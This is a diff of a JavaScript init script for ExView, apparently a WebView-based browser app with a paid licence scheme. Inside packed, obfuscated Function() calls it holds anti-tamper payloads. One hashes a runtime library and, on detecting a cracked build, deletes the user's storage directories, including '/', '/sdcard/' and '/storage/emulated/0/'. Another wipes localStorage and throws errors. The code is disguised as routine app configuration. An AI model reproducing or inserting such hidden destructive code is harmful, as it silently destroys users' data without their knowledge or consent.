@@ -3,18 +3,26 @@
 	var notificationid="2017.03.05";
 	var notificationinfo="【最新】各位非VIP的老阿訇们，因之前各种翻车事件，最新版升级了驾照认证系统，加<b class='color-red'>微信ghostgzt</b>,凭10+捐赠凭证或驾校毕业证明，并提供QQ号，向作者索要正式驾照，以后不用拼车了~安拉胡阿克巴！<br>【重要】近日发现：葫芦侠三楼等地方出现盗版，通过反编译植入后台木马程序，如果不是从酷安市场下载的，请从酷安市场下载最新版，否则造成的损失均与本人无关！";
 	//var notificationinfo="声明：ExView是一个浏览器应用，如果你发现有侵权资源，请不要找我，去找相关站点，你们反编译可以看见ExView就是一个基于WebView的套壳浏览器，你们总不能说浏览器变换一下页面界面就侵权吧！<br>备注:安卓4.0-4.4，请去网盘下载高性能版或使用ExView+,4.4以上WebView性能低下的ROM系统也去下载ExView+！<br>通告：新架构2.2已经不兼容2.2以下的来源，请更新应用版本至2.2以上，和更新所有来源至2.2以上！";
-	function isdesktop(){
-		return navigator.userAgent.toLowerCase().indexOf("exview_desktop")==-1?false:true;
-	}	
-	function isios(){
-		try{
-			if(device.platform=="iOS"){
-				return true;
-			}        
-		}catch(e){
+	if(typeof(iscrosswalk)!="function"){
+		var iscrosswalk=function(){
 			return false;
-		}
-	}	
+		}	
+	}
+	if(typeof(isios)!="function"){
+		var isdesktop=function(){
+			return false;
+		}	
+	}
+	if(typeof(isios)!="function"){
+		var isios=function(){
+			return false;
+		}			
+	}
+	if(typeof(getvipdisp)!="function"){
+		var getvipdisp=function(){
+			return false;
+		}	
+	}
 	if(!isdesktop()){
 		if(isios()){
 			var nowversion=ExView.version;
@@ -85,13 +93,13 @@
 	localStorage.ExView_HackSourceTitle="野鸡车";
 	localStorage.ExView_DisabledHackSource=1;
 	localStorage.ExView_HackSourceLimit=1; 
-	
-	if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"&&!getvipdisp() /* &&!iscrosswalk() */ &&!isdesktop()&&!isios()&&!debug){
-		localStorage.ExView_RefreshPluginPage=1;
-	}else{  
-		delete localStorage.ExView_RefreshPluginPage;
-	}
-	
+	try{
+		if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"&&!getvipdisp() /* &&!iscrosswalk() */ &&!isdesktop()&&!isios()&&!debug){
+			localStorage.ExView_RefreshPluginPage=1;
+		}else{  
+			delete localStorage.ExView_RefreshPluginPage;
+		}
+	}catch(e){}	
 	
 	//delete localStorage.ExView_DisabledHackSource;	
 	localStorage.ExView_Vphotomodendextra='<div align="center" style="width:100%;height:280px"><iframe xonload="mySession.handleIframeOnloaded(this,2)" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" style="width:320px;height:280px;" frameborder="0" scrolling="no" src="http://exview.gtool.ml/gad/300_250.html'+'?'+(new Date().getTime())+'"></iframe></div>';
@@ -154,6 +162,7 @@
 /* 	if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
 		Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('v(["s","m"].u(2.b.c.f(\'6 9!\'+0.4+\'6 9!\'))==-1&&!d.e){7 0.4;g.h="i";7 0.j;2.k.l("\\8\\8\\n\\o\\p\\q\\r~<5>\\t\\3\\a\\w\\x\\y\\z\\A\\B+\\3\\a\\C\\D\\E\\F\\G\\H<5>\\3\\I+\\J\\K\\L\\M",N.O,P(){2.Q.R.S(1)});T U();}',57,57,'localStorage||ExView|u6350|ExView_InitJSON|br|Keep|delete|u597d|Out|u8d60|tools|md5|window|debug|hex_md5|mySession|initjsonpath|RtuFEqa|ExView_InitType|fw|alert|552bc26417cb2969badc8f1229797571|u5750|u516c|u4ea4|u8f66|u5427|9c072c6d89e86e513b2b66af163cf30f|u5df2|indexOf|if|u7684|u8001|u53f8|u673a|uff0c|u51ed10|u51ed|u636e|u627e|u4f5c|u8005|uff01|u8d6050|u53bb|u5e7f|u544a|u9001VIP|sessionStorage|modaltitleextra|function|modules|pluginpage|init|throw|SyntaxError'.split('|'),0,{}))()	
 	} */	
+try{
 	if(getvipdisp()/* ||ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347" */){
 		mySession.initjsonpath=mySession.backinitjsonpath;
 		delete localStorage.ExView_InitJSON;
@@ -162,7 +171,9 @@
 		if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"){
 			Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('t(2(){s b=["u"];$$.z("k.r",2(a){a=3.4.v.x(a);-1!=b.A(a)&&(f("g!\\h\\i\\j\\e\\l\\m\\n\\o\\p\\q"),3.4.5.6("/9/",2(){},2(){},7.8),3.4.5.6("9",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){},7.8),3.4.5.6("/w/9/",2(){},2(){},7.8),3.4.5.6("/c/y/",2(){},2(){},7.8),3.4.5.6("/c/d/0/",2(){},2(){},7.8),3.4.5.6("/B/C/0/",2(){},2(){},7.8),3.4.5.6("/c/d/1/",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){}),3.4.5.6("3",2(){},2(){}))},2(){})},D);',40,40,'||function|ExView|tools|file|rmdir|mySession|fs|sdcard|||storage|emulated|u7528|alert|Hello|u6b22|u8fce|u4f7f|MoeRuntime|u7231|u556a|u59b9|u7834|u89e3|uff01|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|md5|mnt|hex_md5|sdcard0|get|indexOf|data|media|5000'.split('|'),0,{}))()			
 		}
-	} */
+	} */	
+}catch(e){}
+
 
 
 })();
